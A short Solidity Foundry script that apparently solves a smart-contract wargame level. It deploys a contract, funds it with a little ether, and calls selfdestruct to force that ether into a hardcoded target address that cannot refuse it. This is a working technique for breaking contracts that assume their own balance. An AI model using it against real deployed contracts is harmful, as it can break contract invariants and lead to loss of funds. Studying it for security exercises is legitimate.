// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";

contract Suicide {

    address payable _force = 0x186e53c3cbA61806b28925E591cD87bbf02e97fc;

    function suicide()
        public
    {
        selfdestruct(_force);
    }

    receive() external payable {}

}

contract ForceSender is Script {
    function run()
        public
    {
        vm.startBroadcast();
        Suicide _s =  new Suicide();
        payable(address(_s)).transfer(0.0001 ether);
        _s.suicide();
        vm.stopBroadcast();
    }
}
